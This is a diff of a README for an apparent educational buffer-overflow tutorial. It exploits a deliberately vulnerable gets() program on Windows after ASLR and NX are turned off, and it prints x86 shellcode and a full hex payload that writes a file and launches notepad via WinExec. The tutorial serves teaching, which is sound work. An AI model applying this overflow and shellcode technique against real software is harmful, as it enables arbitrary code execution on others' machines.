@@ -33,7 +33,7 @@ int main (int argc, char ** argv) {
 * If we enter short input, for example: "Kirill", everything is ok. But if we will try to enter some long input, program will crash. We can find out in using Event Viewer **evenvwr** command in cmd.
 ![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/crash.png?raw=true "Event Viewer")
 * To find out the crash cause, let's open our program using debugger OllyDbg. In rigth upper corner we can see values of already explained registers. Let's repeat our input, that caused program's crash, and look into registers values. (F9 - program run)
-![Alt text]("C:\Users\leonokir\Docs\Screenshots\registers.png" "Registers")
+![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/registers.png?raw=true "Registers")
 * As we can see, now in register EBP and EIP are ASCII values of our input's letters. And program tries to jump on invalid adress that causes it's crash. How are these values get into registers? Let's examine stack while executing of main function. Stack is located on right bottom corner.
 * Code of main function is located on the top of all instructions. So let set the breakpoint on adress **00401000**.
 ```Assembly x86
@@ -65,10 +65,10 @@ int main (int argc, char ** argv) {
 - After several program runs, we can notice, that the addresses on the stack are always different, that makes our stack analyse more complicated.
 * It's the security concept called ASLR. Address space layout randomization (ASLR) is a technique that is used to increase the difficulty of performing a buffer overflow attack that requires the attacker to know the location of an executable in memory.
 - Let's turn it off using CFF Explorer. We need to open our "main.exe" and change the Optional Header value of "DllCharacteristics". DLL can move is ASLR flag and Image is NX compatible is flag to set non-executable stack. We will turn them both off.
-![Alt text]("C:\Users\leonokir\Docs\Screenshots\cff.png" "CFF Explorer")
+![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/cff.png?raw=true "CFF Explorer")
 - After made changes, let's run program with OllyDbg again. Now we can see, that addresses on stack are always the same. So we can make a atck snapshot on the start and the end of main function.
 * On my system **(it can changes depending on the running system)** now the ESP points on 0x0019FF2C address **(there is located return address on function that is before main)** before execution of instruction 00401000  /$ 55             PUSH EBP and on 0x0019FF10 **(beginning of our buffer)** before execution of 00401032  |. 8BE5           MOV ESP,EBP. 
-![Alt text]("C:\Users\leonokir\Docs\Screenshots\stack.png" "Stack snapshot")
+![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/stack.png?raw=true "Stack snapshot")
 ## The main idea of bufferoverflow
 - Function gets() doesn't have any information about the buffer size. So it will rewrite stack memory with size of input. It leads to rewriting values that are located directly after buffer. As we noticed directly after buffer on stack are located EBP register backup (result of 00401000  /$ 55             PUSH EBP) and return address. The main idea is to rewrite the value of return address with our address, where we can place our code (placed using this input too).
 ## Exploit
@@ -131,7 +131,7 @@ int main()
     return 0;
 }
 ```
-![Alt text]("C:\Users\leonokir\Docs\Screenshots\addr.png" "Addresses")
+![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/addr.png?raw=true "Addresses")
 * Roughly exploit code in C
 ```C
 #include <windows.h>
@@ -147,11 +147,11 @@ int main() {
     return 0;
 }
 ```
-- After finding out the addresses of the necessary instructions, it is possible to write the code in assembler. (Depending on different computers, basically only the instructions marked in red can change).
+- After finding out the addresses of the necessary instructions, it is possible to write the code in assembler.
 * To find out instruction encoding, we can use OllyDbg. With double-clicking on any instruction we can change it and see the new encoding.
-![Alt text]("C:\Users\leonokir\Docs\Screenshots\encoding.png" "OllyDbg")
-Assembly x86
-BA <span style="color:red;">00389A75</span>    MOV EDX,KERNEL32.CreateFileA   
+![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/encoding.png?raw=true "OllyDbg")
+``` Assembly x86
+BA 00389A75    MOV EDX,KERNEL32.CreateFileA   
 // push „output.txt“
 68 78740000    PUSH 7478
 68 75742E74    PUSH 742E7475
@@ -181,13 +181,13 @@ FFD2           CALL EDX  KERNEL32.CreateFileA // This function writes the FileHa
 6A 18          PUSH 18 ; |nBytesToWrite = 18 (24.)
 51             PUSH ECX ; |Buffer
 50             PUSH EAX ; |hFile
-BA <span style="color:red;">803C9A75</span>    MOV EDX,KERNEL32.WriteFile 
+BA 803C9A75    MOV EDX,KERNEL32.WriteFile 
 FFD2           CALL EDX
 58             POP EAX
 50             PUSH EAX / FileHandle
-BA <span style="color:red;">B0359A75</span>    MOV EDX,KERNEL32.CloseHandle
+BA B0359A75    MOV EDX,KERNEL32.CloseHandle
 FFD2           CALL EDX
-BA <span style="color:red;">F0E19D75</span>    MOV EDX,KERNEL32.WinExec
+BA F0E19D75    MOV EDX,KERNEL32.WinExec
 //push „notepad.exe output.txt“
 009D1066     68 78740000    PUSH 7478
 009D106B     68 75742E74    PUSH 742E7475
@@ -200,9 +200,10 @@ BA <span style="color:red;">F0E19D75</span>    MOV EDX,KERNEL32.WinExec
 // SW_SHOW	Activates the window and displays it in its current size and position.
 009D1088     51             PUSH ECX // lpCmdLine
 009D1089     FFD2           CALL EDX
+```
 
 - Now we have hexadicimal code of out exploit 30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 30 FF 19 00 BA 00 38 9A 75 68 78 74 00 00 68 75 74 2E 74 68 6F 75 74 70 8B CC 6A 00 68 80 00 00 00 6A 02 6A 00 6A 00 68 00 00 00 40 51 FF D2 68 6F 6F 6C 00 68 69 73 20 63 68 6C 6F 77 20 68 76 65 72 66 68 65 72 20 6F 68 42 75 66 66 8B CC 68 78 56 34 12 8B FC 50 6A 00 57 6A 18 51 50 BA 80 3C 9A 75 FF D2 58 50 BA B0 35 9A 75 FF D2 BA F0 E1 9D 75 68 78 74 00 00 68 75 74 2E 74 68 6F 75 74 70 68 65 78 65 20 68 70 61 64 2E 68 6E 6F 74 65 8B CC 6A 05 51 FF D2
-that we can write to the file using any hex editor. For example HxD program.
-![Alt text]("C:\Users\leonokir\Docs\Screenshots\hex.png" "HxD")
+* that we can write to the file using any hex editor. For example HxD program.
+![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/hex.png?raw=true "HxD")
 
 
